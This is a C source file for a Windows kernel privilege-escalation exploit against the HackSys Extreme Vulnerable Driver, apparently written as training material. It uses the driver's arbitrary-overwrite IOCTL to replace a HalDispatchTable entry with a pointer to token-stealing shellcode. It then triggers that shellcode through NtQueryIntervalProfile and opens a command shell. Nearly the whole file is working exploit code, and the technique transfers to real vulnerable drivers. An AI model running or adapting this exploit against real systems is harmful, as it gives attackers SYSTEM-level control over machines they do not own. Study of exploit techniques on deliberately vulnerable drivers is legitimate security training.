#include "Header.h"

#define SIZE 8

extern "C" VOID StealToken();

// IOCTL to trigger the arbitrary overwrite vuln, copied from HackSysExtremeVulnerableDriver/Driver/HackSysExtremeVulnerableDriver.h
#define HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_NEITHER, FILE_ANY_ACCESS)

VOID printBanner()
{
	printf( 
		"\n\n"
		"         <'l                       \n"
		"          ll                       \n"
		"          llama~                   \n"
		"          || ||                    \n"
		"          '' ''                    \n"
		"                 - This llama spits\n"
		"\n\n");
}

int main()
{
	printBanner();

	SYSTEM_MODULE krnlInfo = *getNtoskrnlInfo();
	// Get kernel base address in kernelspace
	ULONG addr_ntoskrnl = (ULONG)krnlInfo.ImageBaseAddress;
	printf("[+] Found address to ntoskrnl.exe at 0x%x.\n", addr_ntoskrnl);

	// Load kernel in use in userspace to get the offset to HalDispatchTable
	// NOTE: DO NOT HARDCODE KERNEL MODULE NAME
	printf("[+] Kernel in use: %s.\n", krnlInfo.Name);
	char* krnl_name = strrchr((char*)krnlInfo.Name, '\\') + 1;
	HMODULE user_ntoskrnl = LoadLibraryEx(krnl_name, NULL, DONT_RESOLVE_DLL_REFERENCES);
	if(user_ntoskrnl == NULL)
	{
		printf("[-] Failed to load kernel image.\n");
		exit(-1);
	}

	printf("[+] Loaded kernel in usermode using LoadLibraryEx: 0x%x.\n", user_ntoskrnl);

	ULONG user_HalDispatchTable = (ULONG)GetProcAddress(user_ntoskrnl, "HalDispatchTable");
	if(user_HalDispatchTable == NULL)
	{
		printf("[-] Failed to locate HalDispatchTable.\n");
		exit(-1);
	}

	printf("[+] Found HalDispatchTable in usermode: 0x%x.\n", user_HalDispatchTable);

	// Calculate address of HalDispatchTable in kernelspace
	ULONG addr_HalDispatchTable = addr_ntoskrnl - (ULONG)user_ntoskrnl + user_HalDispatchTable;
	printf("[+] Found address to HalDispatchTable at 0x%x.\n", addr_HalDispatchTable);

	HANDLE driver = getDriverHandle();
	printf("[+] Opened handle to driver: 0x%x\n", driver);
	
	// Allocate memory to construct buffer for driver
	PULONG uBuffer = (PULONG)VirtualAlloc(
		NULL,
		SIZE,
		MEM_COMMIT | MEM_RESERVE,
		PAGE_EXECUTE_READWRITE);

	if (uBuffer == NULL)
	{
		printf("[-] Failed to allocate user buffer.\n");
		exit(-1);
	}
	printf("[+] User buffer allocated: 0x%x\n", uBuffer);

	ULONG What = (ULONG)&StealToken;
	*uBuffer = (ULONG)&What;
	*(uBuffer + 1) = (addr_HalDispatchTable + 4);

	DWORD bytesRet;
	if (DeviceIoControl(
		driver,
		HACKSYS_EVD_IOCTL_ARBITRARY_OVERWRITE,
		uBuffer,
		SIZE,
		NULL,
		0,
		&bytesRet,
		NULL
	))
	{
		printf("[+] Sent buffer to driver.\n");
	}
	else
	{
		printf("[-] Failed to send buffer.\n");
		exit(-1);
	}

	// Trigger the payload by calling NtQueryIntervalProfile()
	HMODULE ntdll = GetModuleHandle("ntdll");
	PtrNtQueryIntervalProfile _NtQueryIntervalProfile = (PtrNtQueryIntervalProfile)GetProcAddress(ntdll, "NtQueryIntervalProfile");
	if (_NtQueryIntervalProfile == NULL)
	{
		printf("[-] Failed to get address of NtQueryIntervalProfile.\n");
		exit(-1);
	}
	printf("[+] Address of NtQueryIntervalProfile: 0x%x.\n", _NtQueryIntervalProfile);
	ULONG whatever;
	_NtQueryIntervalProfile(2, &whatever);

	system("cmd.exe");
	return 0;
}
